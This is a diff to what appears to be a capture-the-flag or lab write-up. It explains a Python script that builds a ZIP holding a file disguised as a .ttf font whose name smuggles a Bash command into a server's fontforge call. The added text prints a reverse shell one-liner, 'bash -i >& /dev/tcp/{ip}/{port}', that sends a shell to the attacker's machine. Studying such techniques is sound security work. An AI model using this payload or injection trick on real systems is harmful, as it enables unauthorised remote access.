@@ -1898,9 +1898,15 @@ with zipfile.ZipFile('exploit.zip', 'w') as zipf:
 print(f"Created exploit.zip with filename: {exploit_filename}")
 ```
 
-**Logic:**
+The goal of this script is to create a filename that looks like a valid `.ttf` font file to a human (and to a simple Regex), but acts like a **Bash command** to the server.
 
-- This script creates a ZIP file containing a single empty file. The name of that file is a Bash command substitution. If the server-side script extracts this and then passes the resulting filename to a shell (like in the `fontforge` call), the command inside the `$()` will execute.
+#### **The Payload (The "Phone Home" instructions)**
+
+```python
+payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
+```
+
+This is a classic reverse shell string. It tells the target: "Open a bash shell and send it over the network to my Kali IP at port 4445."
 <div align="center">
 <br>
 <br>
